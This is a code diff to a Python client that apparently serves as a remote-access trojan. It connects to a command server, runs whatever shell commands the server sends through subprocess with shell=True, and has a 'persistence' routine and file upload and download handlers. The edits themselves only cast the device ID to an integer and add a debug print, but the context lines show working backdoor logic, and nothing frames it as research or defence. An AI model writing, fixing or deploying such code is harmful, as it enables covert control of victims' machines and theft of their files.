@@ -115,7 +115,7 @@ def handle_ping(ping):
     idNumber = ping.get('idNumber')
     command = ping.get('command')
     ip_address = ping.get('ip_address')
-    if idNumber == device_id:
+    if int(idNumber) == device_id:
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             while True:
@@ -144,7 +144,7 @@ def handle_commands(commands):
     idNumber = commands.get('idNumber')
     command = commands.get('command')
     hostname = commands.get('hostname')
-    if idNumber == device_id:
+    if int(idNumber) == device_id:
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output, error = process.communicate()
@@ -163,7 +163,7 @@ def message(module):
     idNumber = module.get('idNumber')
     command = module.get('command')
     hostname = module.get('hostname')
-    if idNumber == device_id:
+    if int(idNumber) == device_id:
         try:
             if command == 'persistence':
                 if not persistenceVariable:
@@ -227,7 +227,7 @@ def upload(input):
     transfer_type = input.get('transfer_type')
     hostname = input.get('hostname')
     file_name = input.get('file_name')
-    if idNumber == device_id:
+    if int(idNumber) == device_id:
         if transfer_type == 'download':
             try:
                 with open(f'{file_name}', 'rb') as file:
@@ -244,7 +244,7 @@ def download(input):
     hostname = input.get('hostname')
     file_name = input.get('file_name')
     file_data = input.get('file_data')
-    if idNumber == device_id:
+    if int(idNumber) == device_id:
         if transfer_type == 'upload':
             try:
                 with open(file_name, 'wb') as file:
@@ -275,6 +275,7 @@ def disconnect():
 def handle_idNumber(data):
     global device_id
     device_id = data.get("idNumber")
+    print("DEVICE ID : ", device_id)
 
 print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
 client.connect(f'http://{server_ip}:{server_port}')
